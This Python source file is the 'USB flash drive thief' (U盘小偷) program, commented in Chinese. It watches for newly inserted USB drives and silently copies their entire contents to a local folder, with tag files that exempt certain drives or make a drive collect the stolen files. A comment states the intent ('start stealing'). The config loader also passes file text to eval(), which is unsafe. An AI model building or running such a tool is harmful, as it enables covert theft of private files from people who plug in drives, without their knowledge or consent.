# -- coding: utf-8 --

import os
import re
import time
import shutil
import threading
import traceback
import logs as L
#import win32file


print("""U盘小偷V1.0.0-alpha1.4
    作者  : Spruce_leaves_
    源代码: https://github.com/Spruce-Leaves/USB-flash-drive-thief
""")


class main():
    def __init__(self):
        self.initialize()
    


    def initialize(self):
        data = self.getConfig("UPanThief.json")
        self.OPTagName = data[0]
        self.noCopyTagName = data[1]
        self.savePath = data[2]
        self.OPCopyPath = data[3]

        self.initialDeviceList = self.getDeviceInfo()
        l.log(self.initialDeviceList)

        self.oldDeviceList = self.initialDeviceList
        self.popDeviceList = []
        self.errorDeviceDict = {"old": [], "new": []}
        self.detectDevice()


    def detectDevice(self):
        while True:

            deviceDataList = self.searchDevice()
            newDeviceList = deviceDataList[0]
            popDeviceList = deviceDataList[1]
            self.errorDeviceDict["old"] = self.errorDeviceDict["new"]

            if deviceDataList[1]:
                self.popDeviceList = deviceDataList[1]
            else:
                pass

            if popDeviceList:
                l.log(f"设备弹出: {popDeviceList}", True)

            if newDeviceList:

                l.log(f"设备接入: {newDeviceList}", True)

                l.outputBufferLogs("         ")

                self.copyDeviceFile(newDeviceList)


                print()   #\n

            else:
                pass

            l.clearBuffer()
            
            time.sleep(0.5)




    def getConfig(self, name) -> tuple[str, str, str, str]:
        #name = "UPanThief.json"

        if name not in os.listdir():   #如果工作目录下没有配置文件
            with open(file = name, mode = "w+", encoding = "utf8") as fo:   #就创建配置文件并填充格式
                fo.write("""{\n    "OPTagFileName" : "",\n    "noCopyTagFileName" : "",\n    "savePath" : "",\n    "OPCopyPath" : ""\n}""")
                print("NO file")

            return ("", "", "", "")
        
        else:   #如果工作目录下有配置文件
            with open(file = name, mode = "r", encoding = "utf8") as fo:   #就开始读取


                def dirDispose(rawData: str) -> str:
                    for fh in ["\\", "/"]:
                        rawData:list[str] = rawData.split(fh)

                        i = 0
                        while True:
                            strObj = rawData[i]

                            if  strObj == "" or strObj.isspace():   #如果字符串为空或只有空格
                                rawData.pop(i)                          #就去掉
                            else:
                                i += 1
                            if i >= len(rawData):
                                break

                        rawData = "/".join(rawData)
                    
                    return rawData


                def formatEnv(strObj: str, envDict: dict) -> str:
                    strList = re.split("({\w+})", strObj)

                    for index_ in range(len(strList)):
                        subStr = strList[index_]
                        if subStr == "" or subStr.isspace() or len(subStr) <= 2:   #如果该字符串为空 或 只有空格 或 长度小于2
                            continue

                        elif (subStr[0] == "{" and subStr[-1] == "}") and\
                                                                        \
                            (subStr[1: -1] in envDict.keys()):   #如果该字符串符合环境变量的格式 且 对应的环境变量 在 环境变量列表 内

                            strList[index_] = "/".join(envDict[subStr[1: -1]].split("\\"))            #就替换为对应的环境变量的值


                    strObj2 = "".join(strList)


                    return strObj2



                envDict = {"WINDIR": os.getenv("WINDIR"), 
                        "APPDATA": os.getenv("APPDATA"), 
                        "USERPROFILE": os.getenv("USERPROFILE"), 
                        "SYSTEMDRIVE": os.getenv("SYSTEMDRIVE"), 
                        "COMPUTERNAME": os.getenv("COMPUTERNAME")}
                    

                data = dirDispose(fo.read())
                data = formatEnv(data, envDict)
                data = "".join(data.split("\n"))
                data = eval(data)
                    

            OPTagName = data["OPTagFileName"]
            noCopyTagName = data["noCopyTagFileName"]
            savePath = data["savePath"]
            OPCopyPath = data["OPCopyPath"]

            return (OPTagName, noCopyTagName, savePath, OPCopyPath)

    


    def copyDeviceFile(self, newDeviceList:list):
        def dirMake(pathStr: str):
            exists = os.path.exists

            if "\\" in pathStr:
                pathStr = "/".join(pathStr.split("\\"))
            else:
                pass

            for j in range(1, len(pathStr.split("/")) + 1):   #就递归(迫真)创建文件夹
                path = "/".join(pathStr.split("/")[0:j])
                L.logs.log(f"path: {path}")
                if exists(path) ==False:
                    os.mkdir(path)
                else:
                    pass


        threadList = []
        for l in newDeviceList:   #这里加个判断路径是否完整存在, 不完整存在就循环make
            newDir = pJoin(self.savePath, l[0])
            exist = os.path.exists(newDir)
            if exist == False:
                dirMake(newDir)

            self.saveInfo(l)
            copyObj = self.copyClass(self, l)
            threadList.append(copyObj)
            copyObj.start()

    def saveInfo(self, device:tuple[str, str, str]):
        infoFileName = "info.txt"
        
        deviceDir = pJoin(self.savePath, device[0])
        infoPath = pJoin(deviceDir, infoFileName)
        exist = os.path.exists(pJoin(infoPath, infoFileName))

        with open(file = infoPath, mode = "a", encoding = "utf8") as fo:
            if exist == False:
                fo.write("分区接入记录:\n")
            
            timeStr = time.strftime("%Y_%m_%d_%H_%M_%S")
            fo.write(f"""        时间: {timeStr}  卷标: {device[1]}  盘符: {device[2]}\n""")




    class copyClass(threading.Thread):
        def __init__(self, invokeClass:object, deviceTuple:tuple[str, str, str]):
            super().__init__()                           #(分区sn码, 分区卷标, 分区盘符)
            self.deviceTuple = deviceTuple
            self.invokeClass = invokeClass
            self.copyState   = True
            l.log(f"已创建线程    : {deviceTuple}")
        


        def run(self):
            l.log(f"线程已开始运行: {self.deviceTuple}")

            protection = False
            excludeList = ["VTOYEFI"]

            
            pathExists = os.path.exists(self.deviceTuple[2])   #判断盘符是否存在

            if pathExists == False:
                print(f"路径不存在   : {self.deviceTuple[2]}")
                print(f"复制终止     : {self.deviceTuple}")
            
            elif self.deviceTuple[0] in excludeList or self.deviceTuple[1] in excludeList:   #通过sn码和卷标排除分区
                l.log(f"排除的分区   : {self.deviceTuple}")
                l.log(f"复制终止     : {self.deviceTuple}")
                
            else:
                dirList = os.listdir(self.deviceTuple[2])

                if self.invokeClass.OPTagName in dirList:   #如果有管理员标记文件
                    l.log(f"管理员U盘    : {self.deviceTuple}")
                    dirList = os.listdir(self.invokeClass.savePath)

                    for fileName in dirList:

                        self.copy(self.invokeClass.savePath, fileName, os.path.join(self.deviceTuple[2], self.invokeClass.OPCopyPath))


                elif self.invokeClass.noCopyTagName in dirList:   #如果没有管理员标记且有"不复制"标记
                    l.log(f"受保护的U盘   : {self.deviceTuple}")
                    protection = True                                 #就不复制


                else:   #如果没有标记文件
                            #就开偷(

                    if os.path.exists(pJoin(self.invokeClass.savePath, self.deviceTuple[0])) == False:   #如果保存路径下没有该U盘的分类文件夹
                        os.mkdir(pJoin(self.invokeClass.savePath, self.deviceTuple[0]))                      #就创建该文件夹
                    else:
                        pass

                    for fileName in dirList:

                        self.copy(self.deviceTuple[2], fileName, pJoin(self.invokeClass.savePath, self.deviceTuple[0]))


                if protection:   #如果是受保护的U盘
                    pass             #就什么都不干

                else:
                    if self.copyState:
                        copyState = "完成"
                    else:
                        copyState = "中断"
                    l.log(f"复制{copyState}: {self.deviceTuple}", True)
                    self.invokeClass.copyState = True


            l.log(f"线程已结束运行: {self.deviceTuple}")



        def copy(self,filePath:str, fileName, newFilePath:str):   #复制方法
               #将路径拼接方法赋值给一个变量(相当于给该方法起了个更短的别名)

            fileFullPath = pJoin(filePath, fileName)

            if os.access(fileFullPath, os.R_OK) == False:
                l.log(f"无法访问: {fileFullPath}")

            else:

                try:
                    pathExists = os.path.exists(self.deviceTuple[2])
                    if pathExists == False:
                        l.log(f"路径不存在: {self.deviceTuple[2]}", True)
                    else:
                        l.log(f"正在复制: {fileName}  {self.deviceTuple}", True)


                        newFullPath = pJoin(newFilePath, fileName)

                        exist = fileName in os.listdir(newFilePath)   #如果目标路径中有同名文件, 该变量就为True(真)
                        isDir = os.path.isdir(fileFullPath)   #如果要被复制的是文件夹, 该变量就为True(真)



                        if exist == False and isDir == False:   #如果不是文件夹且目标文件夹内没有重名文件
                            shutil.copy(fileFullPath, newFilePath)   #就直接复制文件

                        elif exist == False and isDir == True:   #如果是文件夹且目标文件夹内没有重名文件夹
                            shutil.copytree(fileFullPath, newFullPath)   #就直接复制文件夹

                        elif exist == True and isDir == False:   #如果不是文件夹且目标路径中存在同名文件
                                l.log("         " + "已 存 在")                           #就不复制
                        
                        elif exist == True and isDir == True:   #如果是文件夹且目标文件夹下有重名
                            fileList = os.listdir(fileFullPath)   #获取源文件夹内的文件或文件夹
                            for i in fileList:   #遍历文件夹内部
                                self.copy(fileFullPath, i, os.path.join(newFilePath, fileName))   #把列表内的文件或文件夹一个一个一个交给当前方法(copy)从头处理(喜)
                        

                except (FileNotFoundError, shutil.Error, OSError) as err:
                    traceback.print_exc()
                    self.operate()



        def operate(self):
            time.sleep(0.1)
            self.copyState = False
            if self.invokeClass.popDeviceList:
                l.log(f"USB存储设备弹出: {self.invokeClass.popDeviceList}", True)
                self.invokeClass.popDeviceList = []

            else:
                l.log("Error: 路径不存在", True)

            """ if isDir == False:
                os.remove(newFullPath)
                l.log("文件复制中断, 已删除") """



    def searchDevice(self):
        """返回值: tuple(新设备列表, 被弹出设备列表)"""


        a = 5   #重新获取数据次数上限

        for awa in range(a):
            jump = True

            deviceList = self.getDeviceInfo()   #(sn, volumeName, letter)
                                                   #USB硬盘长时间未响应会导致wmic获取的信息异常, 使分区的sn码变成盘符, 卷标变为空
                                                   #    例子:假设一个正常的分区信息是("A1B2C3D4", "本地磁盘", "E:\\"), 
                                                   #         异常信息就变成了("E:", "", "E:\\")
                                                   #    具体问题我也不知到

                
            for d in deviceList:
                if d[0] == d[2][:2] or d[0] == "":   #如果发生异常
                    jump = False        #就重新获取数据
                    break

            if jump == True:
                break



        dl = deviceList
        i = 0

        while True:
            dt = dl[i]   #当前遍历到的设备元组
            if dt[0] == dt[2][:2] or dt[0] == "":   #如果有异常数据
                dl.pop(i)   #就删掉

                if dt not in self.errorDeviceDict["new"]:
                    self.errorDeviceDict["new"].append(dt)
                    l.log(f"设备异常: {dt}", 1)

            else:
                i += 1
            
            if i >= len(deviceList):
                break




        oldLetterList = [self.oldDeviceList[x][2] for x in range(len(self.oldDeviceList))]   #旧盘符列表
        letterList = [deviceList[y][2] for y in range(len(deviceList))]   #当前盘符列表

        newLetterList = [z for z in letterList if z not in oldLetterList]   #新盘符列表
        popLetterList = [a for a in oldLetterList if a not in letterList]   #被弹出的盘符列表

        if newLetterList:
            print(newLetterList)


        newDeviceList = []
        popDeviceList = []

        for i in deviceList:
            for j in newLetterList:
                if i[2] == j:
                    newDeviceList.append(i)
                    break
                else:
                    pass

        for p in popLetterList:
            for o in self.oldDeviceList:
                if o[2] == p:
                    popDeviceList.append(o)
                else:
                    pass



        errorLetterList = []
        for errorDevice in self.errorDeviceDict["old"]:
            errorLetterList.append(errorDevice[2])

        for device in deviceList:
            if device[2] in errorLetterList and device[0] != "":
                self.errorDeviceDict["new"].remove(device)
                l.log(f"设备恢复: {device}", 1)

        deviceList_noFilter = self.getDeviceInfo()
        letterList_noFilter = [x[2] for x in deviceList_noFilter]

        for errorLetter in errorLetterList:
            if errorLetter not in letterList_noFilter:
                self.errorDeviceDict["new"].remove((errorLetter[:2], "", errorLetter))






        l.addBufferLog(f"oldDeviceList : {self.oldDeviceList}")
        l.addBufferLog(f"deviceList    : {deviceList}")
        l.addBufferLog(f"newDeviceList : {newDeviceList}")
        l.addBufferLog(f"popDeviceList : {popDeviceList}")
        l.addBufferLog("-" * len(l.buffer[-1]))

        self.oldDeviceList = deviceList


        return newDeviceList, popDeviceList
    


    def getDeviceInfo(self):
        """返回值: list[ tuple (分区sn码, 分区卷标, 分区盘符) ]"""

        data = os.popen("wmic logicaldisk get VolumeSerialNumber, VolumeName, Name").read()

        data = data.split("\n\n\n\n")[0]
        data = data.split("\n\n")[1:]

        deviceList = []

        for device in data:
            device = device.rstrip(" ")

            letter     = device[:2] + "\\"
            sn         = device[-8:]
            volumeName = device[2:-8].strip(" ")

            deviceList.append((sn, volumeName, letter))


        return deviceList





if __name__ == "__main__":

    l = L.logs()
    pJoin = os.path.join   #path Join
    pSJoin = "/".join      #pathStr Join


    try:
        Main = main()

    except Exception as err:   #如果屎山炸了
        with open(file = "log_{}.txt".format(time.strftime("%Y_%m_%d_%H_%M_%S")), mode = "w+", encoding = "utf8") as fo:   #就把所有变量和报错信息写入日志文件
            
            allVariable = globals()   #获取所有变量
            allVariableKeyList = list(allVariable.keys())
            for i in allVariableKeyList:
                if i == "allVariableKeyList":
                     # i == "allVariable" or
                    pass
                else:
                    fo.write("{}: {}\n".format(i, allVariable[i]))

            fo.write("\n")
            fo.writelines(traceback.format_exc())
        raise err











#一些无意义的历史备份
    """ def copyDeviceFile(self, letterList):
        for l in letterList:
            dirList = os.listdir(l[1])
            if self.OPTagName not in dirList:   #如果没有标记文件
                for fileName in dirList:

                    self.copy(l[1], fileName, self.savePath)

                print("{} 复制完成: {}".format(time.asctime().split(" ")[4], l))

            else:
                pass

    def copy(self,filePath:str, fileName, newFilePath:str):   #复制方法

        if fileName == "System Volume Information":
            print("无法访问: System Volume Information")

        else:
            print("正在复制: {}\r".format(fileName), end = "")
            print(time.asctime().split(" ")[4],end=" ")

               #将路径拼接方法赋值给一个变量(相当于给该方法起了个更短的别名)
            fileFullPath = pJoin(filePath, fileName)
            newFullPath = pJoin(newFilePath, fileName)

            exist = fileName in os.listdir(newFilePath)   #如果目标路径中有同名文件, 该变量就为True(真)
            isDir = os.path.isdir(fileFullPath)   #如果要被复制的是文件夹, 该变量就为True(真)

            if exist == False:   #如果目标文件夹内没有重名文件
                if isDir:           #如果源路径是一个文件夹
                    print("True")


            if exist == False and isDir == False:   #如果不是文件夹且目标文件夹内没有重名文件
                shutil.copy(fileFullPath, newFilePath)   #就直接复制文件

            elif exist == False and isDir == True:   #如果是文件夹且目标文件夹内没有重名文件夹
                shutil.copytree(fileFullPath, newFullPath)   #就直接复制文件夹

            elif exist == True and isDir == False:   #如果不是文件夹且目标路径中存在同名文件
                    pass                                 #就不复制
            
            elif exist == True and isDir == True:   #如果是文件夹且目标文件夹下有重名
                fileList = os.listdir(filePath)   #获取源文件夹内的文件或文件夹
                for i in fileList:   #遍历文件夹内部
                    self.copy(fileFullPath, i, newFilePath)   #把列表内的文件或文件夹一个一个一个交给当前方法(copy)从头处理(喜) """
    


"""                             print("意外的卷标: {}\n    尝试匹配现有U盘文件夹".format(self.deviceTuple)) 
                        SimilarityRate = {}

                        UPanFile = os.listdir(self.deviceTuple[1])
                        if "System Volume Information" in UPanFile:
                            UPanFile.remove("System Volume Information")

                        if UPanFile:
                            for i in os.listdir(self.invokeClass.savePath):

                                PCFile = os.listdir(i)
                                if "System Volume Information" in PCFile:
                                    PCFile.remove("System Volume Information")

                                if PCFile:
                                    repetitionRate = len([x for x in PCFile if x in UPanFile]) / max(len(PCFile), len(UPanFile))
                                    SimilarityRate[i] = repetitionRate

                            maxRepetitionRate = [x for i in SimilarityRate.values()].sort(reverse = True)[0]


                            if maxRepetitionRate >= 0.25:     #如果相似度大于等于25%
                                for i in SimilarityRate.keys():   #就将 目标U盘 视做 保存路径下匹配的已有U盘(文件夹)
                                    if SimilarityRate[i] == maxRepetitionRate:
                                        self.deviceTuple = (i, self.deviceTuple[1])
                                        break
                                print("匹配成功:\n    卷标已更正为: {}".format(self.deviceTuple[0]))

                            elif maxRepetitionRate < 0.25:   #如果相似度小于25%
                                x = 0                            #就创建新的文件夹
                                while True:
                                    if "UPan" + str(x) in dirList:
                                        x += 1
                                    else:
                                        self.deviceTuple = ("UPan" + str(x), self.deviceTuple[1])
                                        break
                                
                                print("匹配失败:\n    卷标已设置为: {}".format(self.deviceTuple[0]))

                        else:
                            pass

                    else:
                        pass """

"""     def dispose(data:str):
            data = data.split("\n" * 4)[0]   #去除末尾的4个换行
            data = data.split("\n\n")[1:]   #分割
            dataList = []
            for d in data:                 #去除末尾空格
                dataList.append(d.rstrip(" "))
            return dataList """
        
        #serialNumber = dispose(serialNumber)
        #volumeName   = dispose(volumeName)
        #letter       = dispose(letter)